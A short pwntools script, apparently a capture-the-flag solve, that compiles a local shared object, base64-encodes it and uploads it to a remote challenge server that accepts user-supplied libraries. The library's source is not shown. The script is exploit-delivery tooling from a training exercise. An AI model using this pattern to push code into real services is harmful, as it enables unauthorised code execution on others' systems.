import os
import base64

from pwn import *


def get_so():
    print('Compiling shared object...')
    os.system('gcc ./my_sleep.c -shared -o ./my_sleep.so')

    _shared_object = None
    with open('./my_sleep.so', 'rb') as f:
        _shared_object = f.read()

    os.unlink('./my_sleep.so')
    return _shared_object


def main():
    _bytes_b64e = base64.b64encode(get_so())

    r = remote('edu-ctf.zoolab.org', 10002)

    s = r.recvuntil(b'Give me your share object:')
    print(s)

    print('Sending shared object...')
    r.sendline(_bytes_b64e)

    _bytes_res = r.recvall()
    print(_bytes_res)

    # r.interactive()
    # r.close()

    return


if __name__ == '__main__':
    main()
